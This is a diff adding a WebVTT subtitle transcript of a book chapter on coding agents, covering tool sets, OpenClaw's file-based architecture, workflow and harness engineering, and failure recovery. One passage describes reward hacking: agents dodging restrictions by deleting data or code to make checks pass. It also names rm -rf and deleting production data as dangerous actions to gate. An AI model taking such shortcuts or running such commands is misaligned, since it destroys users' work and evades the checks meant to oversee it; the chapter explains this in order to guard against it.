@@ -1,0 +1,3610 @@
+WEBVTT
+
+1
+00:00:00.100 --> 00:00:04.512
+Chapter 5: Coding Agents and General-Purpose Agents .
+
+2
+00:00:04.462 --> 00:00:12.350
+The previous chapters delved into context engineering (Chapters 2 and 3) and tool design (Chapter 4).
+
+3
+00:00:12.350 --> 00:00:22.312
+This chapter puts those building blocks together to answer a core question: What does the architecture of a general-purpose Agent capable of handling arbitrary tasks look like?
+
+4
+00:00:22.312 --> 00:00:43.212
+The answer is: A general-purpose Agent targeting open-ended tasks has at its core a Coding Agent (an Agent that can autonomously write, modify, and execute code) plus a file system — the workspace where the Agent stores code, data, memory, and intermediate results, much as a programmer manages projects with folders on a computer.
+
+5
+00:00:43.212 --> 00:00:49.662
+From Manus to OpenClaw, successful open-ended general-purpose Agents all follow this paradigm.
+
+6
+00:00:49.662 --> 00:00:52.750
+Why can code generation carry this weight?
+
+7
+00:00:52.750 --> 00:01:01.150
+Because it is not merely a tool, but a meta-capability — the ability to create new tools and capabilities dynamically at runtime.
+
+8
+00:01:01.150 --> 00:01:07.962
+The latter half of this chapter develops this concept in full, along with the six directions in which it applies.
+
+9
+00:01:07.962 --> 00:01:11.037
+Code serves an Agent on two levels.
+
+10
+00:01:11.037 --> 00:01:22.325
+As a medium for thinking, code enforces rigor — "age greater than 18 and identity verified" admits multiple readings in natural language, but written as code it admits exactly one.
+
+11
+00:01:22.325 --> 00:01:31.887
+As a medium for expression, code that runs is its own proof of logical consistency, and its execution result provides an objective standard of correctness.
+
+12
+00:01:31.887 --> 00:01:48.037
+This chapter begins with the basic capabilities of a Coding Agent and the general-purpose Agent architecture (OpenClaw), then demonstrates the application of code generation in various scenarios — from mathematical reasoning and content creation to system-level meta-capabilities.
+
+13
+00:01:48.037 --> 00:01:49.862
+Coding Agent.
+
+14
+00:01:49.862 --> 00:01:53.262
+Coding as a Foundational Agent Capability.
+
+15
+00:01:53.262 --> 00:02:02.462
+Code generation is not the exclusive domain of a few specialized Agents, but a foundational capability that every general-purpose Agent should possess.
+
+16
+00:02:02.462 --> 00:02:09.075
+With today's SOTA models, giving an Agent basic coding ability requires no elaborate architecture.
+
+17
+00:02:09.075 --> 00:02:18.000
+Consider a typical task: "Organize all leftover TODO comments in the repository, classify them by priority, and generate issues.
+
+18
+00:02:18.000 --> 00:02:32.012
+Getting it done requires browsing the directory structure (ls/glob), reading code (read), modifying files (edit/write), running commands (bash), and searching for patterns (grep/search).
+
+19
+00:02:32.012 --> 00:02:40.325
+These five categories of operations cover almost every core action of a Coding Agent, and they are where the seven tools below come from.
+
+20
+00:02:40.325 --> 00:03:00.150
+Strictly speaking, the five categories map naturally onto six tools; the seventh, the Code Interpreter, covers "execute code / compute" operations and in some implementations is simply folded into Bash — the seven tools are a normalized reference set, not a strict one-to-one mapping onto the five categories.
+
+21
+00:03:00.150 --> 00:03:05.587
+A basic Coding Agent only needs to be equipped with the following seven core tools:
+
+22
+00:03:05.587 --> 00:03:17.262
+Code Interpreter: Provides an isolated sandbox (a secure runtime separated from the host system) in which Python code can run safely without execution errors affecting the host
+
+23
+00:03:17.262 --> 00:03:24.862
+Bash Shell: Executes commands in a terminal, such as running test cases or processing specially formatted files
+
+24
+00:03:24.862 --> 00:03:31.900
+Read File Tool: Reads code, configuration, documentation, logs, etc.
+
+25
+00:03:31.900 --> 00:03:37.762
+Write File Tool: Creates new files or completely overwrites existing files
+
+26
+00:03:37.762 --> 00:03:46.175
+Edit File Tool: Performs partial modifications to existing files, a core operation for code maintenance and iteration
+
+27
+00:03:46.175 --> 00:03:58.325
+Search File Name Tool (Glob): Quickly locates target files in the file system via pattern matching, e.g., using */.py to find all Python files in a project
+
+28
+00:03:58.325 --> 00:04:08.300
+Search File Content Tool (Grep): Searches for specific text patterns within file content, e.g., finding all lines of code that call a certain function
+
+29
+00:04:08.300 --> 00:04:15.537
+These seven tools constitute a complete yet minimal toolbox that almost any Agent system can integrate at low cost.
+
+30
+00:04:15.700 --> 00:04:33.050
+Note that this tool set is the base configuration specific to a Coding Agent, and differs from the five general tool categories of Chapter 4, which were divided by call direction and nature of effect (perception / execution / collaboration / event-triggered / user communication).
+
+31
+00:04:33.000 --> 00:04:37.425
+These seven core tools mainly cover perception and execution.
+
+32
+00:04:37.425 --> 00:04:46.762
+Collaboration, event handling, and user communication still require additional tools, but those fall outside a Coding Agent's core tool set.
+
+33
+00:04:46.762 --> 00:04:51.700
+To see how the seven tools work together, take the simplest of tasks.
+
+34
+00:04:51.700 --> 00:04:57.387
+Suppose the user says, "Help me compile a list of all TODO comments in the project"
+
+35
+00:04:57.387 --> 00:05:02.125
+Refer to the companion repository for the complete code implementation.
+
+36
+00:05:02.125 --> 00:05:09.175
+The entire process used only two tools: Grep (search content) and Write (write file).
+
+37
+00:05:09.175 --> 00:05:21.037
+If the task were more complex — like "count the number of TODOs per module and draw a bar chart" — the Agent would also use the Code Interpreter to execute Python code for statistics and plotting.
+
+38
+00:05:21.037 --> 00:05:27.412
+The seven tools are simple individually; in combination they cover a remarkable range of tasks.
+
+39
+00:05:27.412 --> 00:05:31.675
+A reader might ask: why seven tools and not six?
+
+40
+00:05:31.675 --> 00:05:36.225
+In fact, a single Bash tool can cover most operations.
+
+41
+00:05:36.225 --> 00:05:59.112
+OpenAI Codex's toolset is extremely lean: the shell is its only general-purpose execution entry point, and it browses directories, finds files, and reads them through commands; file modifications go to a syntax-constrained apply_patch tool, which expresses an edit as a structured patch rather than a free-form text command and so lowers the chance of changing the wrong file.
+
+42
+00:05:59.112 --> 00:06:04.300
+Other Agents nevertheless keep dedicated file-reading and file-writing tools.
+
+43
+00:06:04.300 --> 00:06:11.550
+The seven tools in this book are broken out separately to make the basic capabilities a Coding Agent needs easy to grasp.
+
+44
+00:06:11.550 --> 00:06:15.287
+Why should every general-purpose Agent have coding ability?
+
+45
+00:06:15.287 --> 00:06:22.225
+Because code generation is not just about writing programs — it is a general-purpose way of solving problems.
+
+46
+00:06:22.225 --> 00:06:40.712
+Faced with a math problem, the Agent can write code and hand it to a solver for an exact answer; faced with a business rule to pin down, code is far more precise than any natural-language description; missing a tool, it can write one on the spot; when a data format changes, it can generate new parsing logic.
+
+47
+00:06:40.712 --> 00:06:44.587
+Later sections take up each of these scenarios in turn.
+
+48
+00:06:44.587 --> 00:06:54.500
+An Agent with basic coding ability — even one equipped with nothing but the seven simple tools above — can expand its capabilities whenever a new need arises.
+
+49
+00:06:54.500 --> 00:07:00.400
+Case Study: From Manus to OpenClaw — The Coding Core of General-Purpose Agents.
+
+50
+00:07:00.400 --> 00:07:10.775
+General-purpose Agent products such as Manus and OpenClaw combine three major capabilities — Deep Research, Computer Use, and Coding — in a single system.
+
+51
+00:07:10.775 --> 00:07:17.225
+Why, then, did the beginning of this chapter call the Coding Agent the core rather than either of the other two?
+
+52
+00:07:17.225 --> 00:07:22.425
+Because almost all efficient content generation ultimately boils down to code.
+
+53
+00:07:22.425 --> 00:07:32.650
+PowerPoint presentations and Word documents are essentially code in the OOXML format (Office Open XML, Microsoft's open standard for office documents).
+
+54
+00:07:32.650 --> 00:07:49.200
+PDF reports can be generated through Markdown, HTML, or LaTeX; Python scripts can perform data analysis and visualization; even successful browser-operation sequences from GUI work can be captured as reusable code (see Chapter 9).
+
+55
+00:07:49.200 --> 00:07:55.787
+Deep Research search and information synthesis can be implemented through code-driven web requests and parsing.
+
+56
+00:07:55.787 --> 00:08:05.125
+Computer Use is more versatile, but direct code or API calls are generally cheaper, faster, and more reliable for equivalent operations.
+
+57
+00:08:05.125 --> 00:08:11.612
+Code generation is the most efficient, lowest-cost, and most reusable capability foundation.
+
+58
+00:08:11.612 --> 00:08:17.637
+As illustrated in Figure 5-1: Coding Agent Core in OpenClaw Architecture.
+
+59
+00:08:17.637 --> 00:08:21.887
+Understand this architecture through a concrete execution flow.
+
+60
+00:08:21.887 --> 00:08:28.350
+Suppose the user asks: "Help me analyze last quarter's sales data and create a summary report.
+
+61
+00:08:28.350 --> 00:08:37.212
+Read Memory: The Agent reads MEMORY.md and discovers the user prefers PDF format reports and the data source is Google Sheets
+
+62
+00:08:37.372 --> 00:08:46.359
+Call Tools: Obtains usage instructions for the Google Sheets API via the web search module, downloads data via code execution
+
+63
+00:08:46.309 --> 00:08:53.959
+Write Code: Generates a data analysis script in Python (pandas aggregation, matplotlib visualization)
+
+64
+00:08:53.959 --> 00:09:01.534
+Generate Artifacts: Writes the analysis results to report.pdf, charts to the charts/ directory
+
+65
+00:09:01.534 --> 00:09:11.359
+Update Memory: Records in MEMORY.md that "User's sales data is in Google Sheets, ID: xxx," so it doesn't need to ask next time
+
+66
+00:09:11.359 --> 00:09:22.534
+Throughout the process, the file system is the hub of information flow — memory is read from files, artifacts are written to files, and experience is also saved as files.
+
+67
+00:09:22.534 --> 00:09:25.772
+The File System as the Agent's Central Hub.
+
+68
+00:09:25.772 --> 00:09:34.997
+In OpenClaw's design, the file system is far more than data storage — it is the central hub for the Agent's memory, knowledge, and capabilities.
+
+69
+00:09:34.997 --> 00:09:43.972
+The Agent's long-term memory is stored in MEMORY.md (high-level facts and user preferences) and Markdown logs archived by date.
+
+70
+00:09:43.972 --> 00:10:06.322
+Choosing Markdown over a vector database may seem counterintuitive, but it is extremely effective: users can directly open files to read and modify the Agent's memory (if the Agent misremembers something, just delete that line), Markdown naturally preserves chronological order to avoid temporal confusion in semantic retrieval, and it supports version control and rollback via Git.
+
+71
+00:10:06.322 --> 00:10:14.009
+More critically, because the Agent can write files, it has the technical means to modify its own external artifacts.
+
+72
+00:10:14.009 --> 00:10:29.497
+When an Agent performs a task for the first time and discovers key information it did not previously know—for example, when calling a particular bank, it learns that the bank requires the branch address for identity verification—it can first write the discovery into a record.
+
+73
+00:10:29.497 --> 00:10:39.247
+Determining when such a record is sufficient to become reliable knowledge, an instruction, or a program still requires additional trajectories and outcome validation.
+
+74
+00:10:39.247 --> 00:10:43.872
+This is the problem of continuous evolution discussed in Chapter 9.
+
+75
+00:10:43.872 --> 00:10:48.859
+Applicability Boundary: Which Agents Have Coding as Their Core Architecture.
+
+76
+00:10:48.859 --> 00:11:06.059
+The conclusion that "the Coding Agent is the core of a general-purpose Agent" mainly applies to general-purpose Agents targeting open-ended tasks — scenarios like deep research, content generation, and data processing, where task boundaries are uncertain and artifact forms are diverse.
+
+77
+00:11:06.059 --> 00:11:20.959
+In these scenarios, it is impossible to enumerate all needed tools in advance; code generation, as a meta-capability, provides the most economical path for dynamically expanding capability boundaries, making it the core of the architecture.
+
+78
+00:11:20.959 --> 00:11:37.447
+By contrast, vertical-domain customer-service Agents operate in relatively closed task spaces, with core architectures built around fixed business processes, domain tools, and dialogue strategies; there, code is a tool in the toolbox rather than the architectural hub.
+
+79
+00:11:37.447 --> 00:11:47.709
+However, even in the latter, coding is an important foundational capability: precise calculation, data processing, and rule verification all depend on it.
+
+80
+00:11:47.709 --> 00:11:50.997
+The Overall Workflow of a Coding Agent.
+
+81
+00:11:50.997 --> 00:11:55.834
+As illustrated in Figure 5-2: Coding Agent Workflow.
+
+82
+00:11:55.834 --> 00:11:58.159
+Project Documentation.
+
+83
+00:11:58.159 --> 00:12:03.159
+A Coding Agent's work begins with a systematic understanding of the project.
+
+84
+00:12:03.159 --> 00:12:17.434
+When an Agent first encounters a code repository, its first job is not to start modifying code but to build a cognitive framework for the whole project—just as a new engineer doesn't push code on day one, but starts by learning the lay of the land.
+
+85
+00:12:17.434 --> 00:12:25.722
+The Agent begins by checking whether the project has documentation—a README, architecture design documents, developer guides.
+
+86
+00:12:25.722 --> 00:12:30.647
+If key documents are missing, the Agent should not start working blindly.
+
+87
+00:12:30.647 --> 00:12:44.072
+It should systematically inspect the codebase, identify the main modules, core abstractions, and component dependencies, and draft an architecture overview, directory guide, and instructions for running tests.
+
+88
+00:12:44.072 --> 00:12:50.734
+These documents serve as a blueprint for the Agent's subsequent work and provide an entry point for other developers.
+
+89
+00:12:50.734 --> 00:12:57.634
+This embodies a key principle: making project knowledge explicit is a prerequisite for efficient collaboration.
+
+90
+00:12:57.796 --> 00:13:03.883
+Project documentation now has a form specific to Agents: Project Instruction Files.
+
+91
+00:13:03.833 --> 00:13:17.246
+Files like CLAUDE.md, AGENTS.md, .cursorrules have become de facto industry standards—they are automatically injected into the context at the start of every session, acting as project-level system prompts.
+
+92
+00:13:17.246 --> 00:13:35.171
+Unlike READMEs intended for human readers, instruction files carry behavior conventions for Agents: build and test commands ("use pnpm test instead of npm test"), code style ("avoid the any type"), and clear restricted zones ("do not modify the migrations/ directory").
+
+93
+00:13:35.171 --> 00:13:54.096
+This is the same idea as OpenClaw's SOUL.md (defining the Agent's identity and behavior rules) and MEMORY.md (accumulating cross-session experience), applied at different levels: SOUL.md defines "who the Agent is," while project instruction files define "how to work in this project.
+
+94
+00:13:54.096 --> 00:14:12.771
+From the perspective of context engineering in Chapter 2, instruction files are also the most economical stable prefix—their content doesn't change with the task, making them naturally KV Cache-friendly; they are also the most direct implementation of the principle that "knowledge must exist within the codebase itself.
+
+95
+00:14:12.771 --> 00:14:32.646
+This is exactly where Chapter 2's judgment—"a team friendly to remote work is usually friendly to AI Agents too"—lands at the level of the code repository: decisions recorded in documents, context written into issue and PR descriptions, internal experience distilled into a developer guide, so that the Agent can read them at all.
+
+96
+00:14:32.646 --> 00:14:43.496
+From this follows a simple gauge of how "AI-ready" a team is: can a remote newcomer, relying only on the repository and the documentation, start working independently?
+
+97
+00:14:43.496 --> 00:14:47.196
+Task Understanding and Requirements Clarification.
+
+98
+00:14:47.196 --> 00:14:58.471
+For simple requirements with clear boundaries and limited impact—such as fixing a known bug or adjusting a function's parameters—the Agent can proceed directly to the implementation phase.
+
+99
+00:14:58.471 --> 00:15:02.996
+However, most tasks in software development are not this simple.
+
+100
+00:15:03.148 --> 00:15:08.235
+For complex requirements, the Agent must be more cautious and methodical.
+
+101
+00:15:08.185 --> 00:15:29.335
+Complexity can arise from multiple dimensions: the ambiguity of the requirement itself (the user knows what they want but cannot express it precisely), the diversity of implementation paths (multiple technical solutions with their own trade-offs), or the breadth of impact (requiring modifications to multiple modules, potentially breaking existing functionality).
+
+102
+00:15:29.335 --> 00:15:37.160
+The Agent should clarify boundaries through exploratory research and proactively engage in dialogue with the user when necessary.
+
+103
+00:15:37.160 --> 00:15:57.010
+For example, when a user asks to "optimize system performance," the Agent first needs to determine the specific goal (reducing response time, decreasing memory usage, or increasing throughput), which trade-offs are acceptable (for example, whether increased code complexity is acceptable), and where the current bottleneck lies.
+
+104
+00:15:57.010 --> 00:16:02.523
+Starting to code while the requirements are still vague often leads to significant rework.
+
+105
+00:16:02.523 --> 00:16:04.948
+Writing a Design Document.
+
+106
+00:16:04.948 --> 00:16:11.523
+A design document is a bridge that translates abstract requirements into a concrete implementation plan.
+
+107
+00:16:11.523 --> 00:16:24.923
+It should answer four core questions: which modules should be modified and why, which approach should be chosen and what trade-offs it entails, which new dependencies are needed, and what impact the changes are expected to have on the system.
+
+108
+00:16:24.923 --> 00:16:34.598
+Writing a design document is itself deep thinking—it forces the Agent to conceptually validate the feasibility of a solution before investing heavily in coding.
+
+109
+00:16:34.598 --> 00:16:45.323
+More importantly, the design document provides an efficient intervention point for humans—reviewing a concise design document is much easier than reviewing hundreds of lines of code.
+
+110
+00:16:45.323 --> 00:16:52.385
+After completing the design document, the Agent should submit it for user review and wait for approval before proceeding.
+
+111
+00:16:52.385 --> 00:16:55.110
+Code Implementation and Testing.
+
+112
+00:16:55.110 --> 00:17:08.748
+After obtaining design approval, the Agent follows the project's code conventions for implementation, reuses existing abstractions and tools, and performs moderate refactoring when necessary to maintain the health of the codebase.
+
+113
+00:17:08.748 --> 00:17:22.198
+After implementation, the Agent immediately enters a test-driven quality assurance phase—writing test cases for the new or modified functionality, covering normal paths, boundary conditions, and error scenarios.
+
+114
+00:17:22.198 --> 00:17:26.573
+After writing the tests, the Agent executes the test suite.
+
+115
+00:17:26.573 --> 00:17:37.060
+If tests fail, the Agent should not simply report the failure to the user but should analyze the cause, locate the problem, and modify the code until all tests pass.
+
+116
+00:17:37.060 --> 00:17:47.760
+This "test-fix" loop may require several iterations, and it is this self-correcting ability that elevates a Coding Agent from a code generator to a reliable engineering assistant.
+
+117
+00:17:47.760 --> 00:17:58.185
+Conversely, the most common way a Coding Agent slacks off is to skip this stage entirely—writing the code and reporting "task complete" without ever running the tests.
+
+118
+00:17:58.185 --> 00:18:09.973
+Defining "tests pass," rather than "code written," as the completion criterion is precisely Loop Engineering's principle of letting verification decide when it is safe to stop, applied to coding.
+
+119
+00:18:09.973 --> 00:18:14.185
+Even if all tests pass, the Agent's work is not done.
+
+120
+00:18:14.185 --> 00:18:19.985
+The next phase is code review: the Agent critically examines its own generated code.
+
+121
+00:18:19.985 --> 00:18:22.960
+Is it readable and adequately commented?
+
+122
+00:18:22.960 --> 00:18:27.185
+Are there lurking performance problems or security vulnerabilities?
+
+123
+00:18:27.185 --> 00:18:31.285
+Does it follow the project's code style and best practices?
+
+124
+00:18:31.285 --> 00:18:38.560
+This self-review can be done by reading the code, running lint tools, or calling a dedicated code review sub-agent.
+
+125
+00:18:38.560 --> 00:18:46.935
+If the review finds issues, the Agent should return to the modification phase and fix them, rather than delivering flawed code to the user.
+
+126
+00:18:46.935 --> 00:18:50.348
+Documentation Synchronization and Delivery.
+
+127
+00:18:50.500 --> 00:19:05.150
+If the code changes involve architectural changes—such as introducing a new module, changing dependencies between modules, or altering the semantics of core abstractions—the Agent needs to update the architecture documentation accordingly.
+
+128
+00:19:05.100 --> 00:19:11.137
+Outdated documentation is worse than no documentation because it misleads future developers.
+
+129
+00:19:11.137 --> 00:19:20.625
+By automatically updating documentation after every significant change, the Agent helps maintain the integrity and timeliness of the project's knowledge base.
+
+130
+00:19:20.625 --> 00:19:31.200
+This workflow embodies the core principles of software engineering: planning precedes action, verification runs throughout, and documentation evolves together with the code.
+
+131
+00:19:31.200 --> 00:19:36.075
+Note that the process described above is a recommended engineering workflow.
+
+132
+00:19:36.075 --> 00:19:49.575
+Real-world Coding Agents (such as Claude Code and Codex) trim it as needed: a simple bug-fix task skips generating a design document, while only complex, wide-reaching tasks go through every stage in full.
+
+133
+00:19:49.575 --> 00:19:53.225
+Different models trim this workflow in different ways.
+
+134
+00:19:53.225 --> 00:20:01.025
+Some Coding models read the repository structure, implementation, callers, and tests broadly before the first edit.
+
+135
+00:20:01.025 --> 00:20:09.962
+Others inspect only the few files most likely to matter, make an early patch, and treat compiler and test feedback as part of the investigation.
+
+136
+00:20:09.962 --> 00:20:21.162
+This threshold for deciding when to stop gathering information and start acting can continue to follow the model after the harness changes, and can change when the model is swapped inside the same harness.
+
+137
+00:20:21.162 --> 00:20:27.900
+It is therefore first and foremost a learned model behavior, not merely the interface style of a Coding product.
+
+138
+00:20:27.900 --> 00:20:35.112
+Prompts, tools, and budgets in the harness can still amplify or suppress it, but need not be its source.
+
+139
+00:20:35.112 --> 00:20:43.650
+Chapter 7 measures this difference in a fixed harness; Chapter 8 then explains how post-training may write such a policy into the parameters.
+
+140
+00:20:43.650 --> 00:20:47.225
+Harness Engineering in Practice for Coding Agents.
+
+141
+00:20:47.225 --> 00:20:53.787
+Chapter 1 introduced the concept of Harness Engineering and the formula Agent = Model + Harness.
+
+142
+00:20:53.787 --> 00:21:06.275
+The Harness here includes the context and tools from the core formula, as well as constraints, verification, and correction mechanisms—these five elements together constitute the Harness defined in Chapter 1.
+
+143
+00:21:06.275 --> 00:21:19.800
+Coding Agents are perhaps the domain where Harness Engineering pays off most—code writing is the most verifiable of all Agent tasks, and its constraints, verification, and correction can all lean on existing infrastructure.
+
+144
+00:21:19.800 --> 00:21:24.662
+This section focuses on concrete practice in the Coding Agent scenario.
+
+145
+00:21:24.662 --> 00:21:32.675
+Whether a system runs stably often depends less on the power of the model and more on the robustness of the infrastructure built around the Agent.
+
+146
+00:21:32.675 --> 00:21:44.937
+Chapter 1 divides the Harness into two layers—Context and Tools (enabling the Agent to act) and Constraints, Verification, and Correction (helping the Agent act safely and correctly).
+
+147
+00:21:44.937 --> 00:21:50.525
+In the Coding Agent scenario, these translate into specific engineering components:
+
+148
+00:21:50.525 --> 00:22:03.687
+Acceptance Baseline: What constitutes "done"—test suites, CI pipeline (Continuous Integration pipeline, a series of checks automatically run after code submission), code review standards
+
+149
+00:22:03.687 --> 00:22:12.050
+Execution Boundary: What the Agent can and cannot touch—module boundaries, dependency rules, permission controls
+
+150
+00:22:12.050 --> 00:22:24.762
+Feedback Signals: Automated correctness judgments—Linter (code style checking tool that can automatically find formatting errors and potential issues) output, test results, type checking errors
+
+151
+00:22:24.762 --> 00:22:33.637
+Rollback Mechanism: How to recover if something goes wrong—Git version control, sandbox isolation, snapshot rollback
+
+152
+00:22:33.637 --> 00:22:38.125
+Why Coding Agents Are Particularly Suitable for Harness Engineering.
+
+153
+00:22:38.284 --> 00:22:46.246
+Two dimensions — how clear the goal is, and how automated the verification is — divide tasks into four states.
+
+154
+00:22:46.196 --> 00:23:04.809
+A clear goal with automatically verifiable results is the territory where Agents thrive; a clear goal whose acceptance still depends on human eyes caps throughput at the speed of human review; automated feedback with a vague goal lets the system run efficiently in the wrong direction; lacking both, the Agent is of little use.
+
+155
+00:23:04.809 --> 00:23:08.446
+Table 5-1 shows these four states.
+
+156
+00:23:08.446 --> 00:23:16.159
+The goal of the Harness is to push as many tasks as possible into the "clear goal + automated verification" quadrant.
+
+157
+00:23:16.159 --> 00:23:21.721
+Table 5-1 Four Quadrants of Task Clarity and Verification Automation
+
+158
+00:23:21.721 --> 00:23:33.884
+Results can be automatically verified: Sweet spot: fixing bugs with test cases; Results require manual verification: Throughput-limited: code refactoring requires manual review.
+
+159
+00:23:33.884 --> 00:23:46.609
+Results can be automatically verified: Efficiently going off track: optimizing "code quality" with a linter; Results require manual verification: Hard to start: "make the UI look better".
+
+160
+00:23:46.609 --> 00:24:03.459
+Code-writing tasks naturally occupy the "clear goal + automated verification" quadrant—test suites provide clear acceptance criteria, linters and type checkers offer instant automated verification, and Git provides perfect version control and rollback capabilities.
+
+161
+00:24:03.459 --> 00:24:17.696
+This explains why Coding Agents are currently the most mature among all Agent types: not because code generation models are particularly powerful, but because decades of software engineering infrastructure naturally constitute a robust Harness.
+
+162
+00:24:17.696 --> 00:24:19.834
+Industry Practice.
+
+163
+00:24:19.834 --> 00:24:24.359
+Three case studies of Harness practice confirm the above principles:
+
+164
+00:24:24.359 --> 00:24:48.971
+Large-scale code migration case (from a large tech company's publicly shared large-scale code migration practice): The key was not the model's strength, but the Harness doing three things right—knowledge must exist within the codebase itself (what the Agent cannot see does not exist), constraints are encoded into linters and CI rather than written in documentation, and verification and correction are fully automated end-to-end.
+
+165
+00:24:48.971 --> 00:24:59.284
+LangChain: Significantly improved benchmark task performance solely by optimizing the Harness (system prompts, tool middleware, self-verification loops).
+
+166
+00:24:59.284 --> 00:25:10.309
+Particularly noteworthy is the methodology of "using an Agent to analyze failure trajectories to improve the Harness," shifting Harness engineering from experience-driven to data-driven.
+
+167
+00:25:10.309 --> 00:25:29.934
+Anthropic: Splits long tasks into two roles—an initialization Agent responsible for breaking down large tasks into a task list, and an execution Agent responsible for progressing step by step, leaving intermediate results (such as completed code files and updated task lists) for the next round to continue using.
+
+168
+00:25:29.934 --> 00:25:37.984
+This division of labor solves the problem of long-running Agents "trying to do too much at once" or "claiming completion prematurely.
+
+169
+00:25:37.984 --> 00:25:41.946
+From Coding Agent to General Harness Design Principles.
+
+170
+00:25:41.946 --> 00:25:48.496
+The Harness practices of Coding Agents provide transferable design principles for all Agent systems:
+
+171
+00:25:48.496 --> 00:25:56.146
+Constraints over guidance: Rules that can be enforced with code should be encoded there, not merely suggested in documentation.
+
+172
+00:25:56.146 --> 00:26:02.684
+The value of linter rules, type constraints, and CI checks far exceeds "please follow...
+
+173
+00:26:02.684 --> 00:26:09.871
+guidance in system prompts—the former means "cannot be done," the latter is merely "advised against.
+
+174
+00:26:09.871 --> 00:26:14.796
+Automate verification: Manual review is an unscalable bottleneck.
+
+175
+00:26:14.796 --> 00:26:22.984
+Investment in test suites, code quality checks, and behavior monitoring yields far higher returns than adding more human effort.
+
+176
+00:26:22.984 --> 00:26:33.134
+Feedback should be as fast and structured as possible: The more detailed the error message and the closer it is to the moment of error, the more efficiently the Agent can correct itself.
+
+177
+00:26:33.134 --> 00:26:41.271
+The Agent status bar techniques from Chapter 2 (detailed error messages, tool call counters) embody this principle.
+
+178
+00:26:41.271 --> 00:26:47.609
+Rollback must be reliable: Agents can only experiment boldly when operating within a safety net.
+
+179
+00:26:47.609 --> 00:26:54.346
+Git branches, sandbox environments, and snapshot mechanisms ensure any error is reversible.
+
+180
+00:26:54.508 --> 00:26:58.895
+A deeper purpose of constraints: preventing process errors.
+
+181
+00:26:58.845 --> 00:27:08.583
+The acceptance baseline governs whether the outcome is right; the execution boundary governs the process—even a correct outcome does not justify a wrong method.
+
+182
+00:27:08.583 --> 00:27:20.983
+Deleting and rebuilding the database to "fix" a database fault does repair it, but the data is gone; deleting all the code to fix a compilation error does make compilation pass, but the implementation is gone.
+
+183
+00:27:20.983 --> 00:27:35.108
+Such destructive shortcuts always exist: even when restrictions are written into the final evaluation metrics, Agents often find ways around them—this is the everyday form of reward hacking (Chapter 8) in Agent tasks.
+
+184
+00:27:35.108 --> 00:27:53.108
+A production Harness therefore places dedicated checks and approvals on dangerous actions like rm -rf, deleting production data, or overwriting an unread file (semantic parsing in this chapter's security section, Sidecar review in Chapter 4), constraining actions, not merely outcomes.
+
+185
+00:27:53.108 --> 00:28:14.008
+RLVP in Chapter 8 (Reinforcement Learning with Verified Penalty—"reward the outcome, penalize the path") answers the same question from the training side: beyond the final outcome reward, it penalizes verifiable violations along the path, internalizing "no destructive means" as the model's engineering common sense.
+
+186
+00:28:14.008 --> 00:28:23.095
+For an existing model, Harness guardrails are external constraints; for a trainable model, process penalties internalize the same constraints.
+
+187
+00:28:23.095 --> 00:28:25.183
+The goal is the same.
+
+188
+00:28:25.183 --> 00:28:28.808
+Tool Orchestration: Fault Boundary Control.
+
+189
+00:28:28.808 --> 00:28:32.733
+Mature Coding Agents support parallel tool calls.
+
+190
+00:28:32.733 --> 00:28:41.195
+The unique problem from the Harness perspective is how faults propagate: when one tool fails, which calls should be aborted and which should continue?
+
+191
+00:28:41.195 --> 00:28:48.370
+The principle is that faults propagate only within the same batch of parallel calls, not up to the parent operation.
+
+192
+00:28:48.370 --> 00:28:58.633
+When reading three files in parallel, for example, a missing file should cause only that call to fail; it should neither cancel the other two nor abort the entire task.
+
+193
+00:28:58.633 --> 00:29:06.170
+This fine-grained fault boundary control avoids the fragile pattern of "one command failure aborting the entire task.
+
+194
+00:29:06.170 --> 00:29:15.783
+The specific mechanisms for parallel calls, streaming parsing, and cascading aborts are detailed in the "Implementation Tips" section of this chapter.
+
+195
+00:29:15.783 --> 00:29:18.320
+Failure and Error Recovery.
+
+196
+00:29:18.320 --> 00:29:29.270
+The previous section presented the principles and components of Harness engineering; this section dives into the piece that most differentiates engineering maturity—failure and error recovery.
+
+197
+00:29:29.270 --> 00:29:43.420
+The ablation experiment in Chapter 1 showed how severe the problem can be: missing a single piece of tool-result feedback is enough to trap an Agent in an infinite loop—and real production environments see far more diverse failures than any experiment.
+
+198
+00:29:43.420 --> 00:29:49.820
+This section systematically answers three questions: What failures does a production Harness encounter?
+
+199
+00:29:49.820 --> 00:29:52.583
+How are they detected and recovered from?
+
+200
+00:29:52.583 --> 00:29:55.133
+And when must the system terminate?
+
+201
+00:29:55.133 --> 00:29:58.695
+A taxonomy of failures: four layers.
+
+202
+00:29:58.695 --> 00:30:02.945
+The first step toward a systematic response is classification.
+
+203
+00:30:02.945 --> 00:30:06.883
+Failures fall into four layers according to where they occur:
+
+204
+00:30:07.036 --> 00:30:18.236
+API layer: rate limiting (HTTP 429), service overload, request timeouts, connection drops, and output truncated at the token limit.
+
+205
+00:30:18.186 --> 00:30:23.598
+These failures are unrelated to the task itself—they are infrastructure noise.
+
+206
+00:30:23.598 --> 00:30:40.223
+Tool layer: hallucinated calls (invoking a tool that does not exist), malformed arguments (violating the tool's input contract), execution exceptions, and the most dangerous kind—a tool repeatedly returning the same error while the model retries it unchanged.
+
+207
+00:30:40.223 --> 00:30:50.286
+Context layer: context window overflow, compaction failure, and corrupted trajectory structure (such as a tool call missing its paired result message).
+
+208
+00:30:50.286 --> 00:31:03.373
+Control-flow layer: infinite loops (repeating the same operation with no progress) and death spirals (recovery logic triggered by an error itself calls the LLM, fails again, and cascades).
+
+209
+00:31:03.373 --> 00:31:07.048
+Detection: classify first, then count.
+
+210
+00:31:07.048 --> 00:31:13.611
+When a failure occurs, the first question is not "Should we retry?" but "Would retrying help?
+
+211
+00:31:13.611 --> 00:31:32.111
+Retryable errors (rate limiting, overload, network jitter) deserve retries; non-retryable errors (invalid arguments, insufficient permissions, nonexistent tool) will produce the same result no matter how many times they are retried as-is—the input or strategy must change.
+
+212
+00:31:32.111 --> 00:31:39.661
+A production Harness maintains a mapping from error types to recovery strategies, rather than a blanket "retry on error.
+
+213
+00:31:39.661 --> 00:31:43.398
+Beyond individual errors, detect patterns.
+
+214
+00:31:43.398 --> 00:31:58.948
+First, repeated-call fingerprints: hash the "tool name + arguments" pair; the same fingerprint recurring is a clear signal of a no-progress loop—the Agent in Chapter 1's ablation experiment calling the same tool over and over was exactly this pattern.
+
+215
+00:31:58.948 --> 00:32:07.773
+Second, consecutive-failure counters: each recovery path keeps its own counter, providing the basis for the circuit breakers discussed later.
+
+216
+00:32:07.773 --> 00:32:15.273
+A third class of failures does not manifest as errors at all and requires dedicated liveness and integrity monitoring.
+
+217
+00:32:15.273 --> 00:32:28.861
